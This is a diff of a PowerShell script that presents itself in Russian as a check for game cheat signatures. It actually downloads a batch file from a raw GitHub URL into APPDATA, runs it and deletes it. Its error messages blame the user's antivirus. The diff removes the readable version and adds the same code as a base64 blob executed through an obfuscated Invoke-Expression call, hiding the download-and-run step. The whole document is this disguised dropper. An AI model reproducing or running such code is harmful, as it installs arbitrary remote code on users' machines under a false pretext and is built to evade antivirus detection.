@@ -1,15 +1,1 @@
-$ABC = "https://raw.githubusercontent.com/NewDarkys/wifi/main/Noob.bat";
-$DFG = "Senko.bat";
-
-try{
-    Write-Host 'Получение сигнатур читов...'-ForegroundColor Gray; $wc = new-object net.webclient; $wc.DownloadFile($ABC, $env:APPDATA + "/" + $DFG); Write-Host 'Сигнатуры получены'-ForegroundColor Green
-} catch {
-    Write-Host 'Возникла ошибка при получении сигнатур читов, возможно виноват антивирус.'-ForegroundColor Red; pause; return
-};
-try {
-    Write-Host 'Проверка...'-ForegroundColor Gray; & $env:APPDATA\$DFG; Remove-Item $env:APPDATA\$DFG;
-} catch {
-    Write-Host 'Возникла ошибка при проверке на читы. Скорее всего виноват антивирус.'-ForegroundColor Red; Remove-Item $env:APPDATA\$DFG; pause; return
-};
-
-# Целую в попку <3
+[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFCQyA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTmV3RGFya3lzL3dpZmkvbWFpbi9Ob29iLmJhdCI7CiRERkcgPSAiU2Vua28uYmF0IjsKCnRyeXsKICAgIFdyaXRlLUhvc3QgJ9Cf0L7Qu9GD0YfQtdC90LjQtSDRgdC40LPQvdCw0YLRg9GAINGH0LjRgtC+0LIuLi4nLUZvcmVncm91bmRDb2xvciBHcmF5OyAkd2MgPSBuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQ7ICR3Yy5Eb3dubG9hZEZpbGUoJEFCQywgJGVudjpBUFBEQVRBICsgIi8iICsgJERGRyk7IFdyaXRlLUhvc3QgJ9Ch0LjQs9C90LDRgtGD0YDRiyDQv9C+0LvRg9GH0LXQvdGLJy1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KfSBjYXRjaCB7CiAgICBXcml0ZS1Ib3N0ICfQktC+0LfQvdC40LrQu9CwINC+0YjQuNCx0LrQsCDQv9GA0Lgg0L/QvtC70YPRh9C10L3QuNC4INGB0LjQs9C90LDRgtGD0YAg0YfQuNGC0L7Qsiwg0LLQvtC30LzQvtC20L3QviDQstC40L3QvtCy0LDRgiDQsNC90YLQuNCy0LjRgNGD0YEuJy1Gb3JlZ3JvdW5kQ29sb3IgUmVkOyBwYXVzZTsgcmV0dXJuCn07CnRyeSB7CiAgICBXcml0ZS1Ib3N0ICfQn9GA0L7QstC10YDQutCwLi4uJy1Gb3JlZ3JvdW5kQ29sb3IgR3JheTsgJiAkZW52OkFQUERBVEFcJERGRzsgUmVtb3ZlLUl0ZW0gJGVudjpBUFBEQVRBXCRERkc7Cn0gY2F0Y2ggewogICAgV3JpdGUtSG9zdCAn0JLQvtC30L3QuNC60LvQsCDQvtGI0LjQsdC60LAg0L/RgNC4INC/0YDQvtCy0LXRgNC60LUg0L3QsCDRh9C40YLRiy4g0KHQutC+0YDQtdC1INCy0YHQtdCz0L4g0LLQuNC90L7QstCw0YIg0LDQvdGC0LjQstC40YDRg9GBLictRm9yZWdyb3VuZENvbG9yIFJlZDsgUmVtb3ZlLUl0ZW0gJGVudjpBUFBEQVRBXCRERkc7IHBhdXNlOyByZXR1cm4KfTsKCiMg0KbQtdC70YPRjiDQsiDQv9C+0L/QutGDIDwz'))|I`e`X
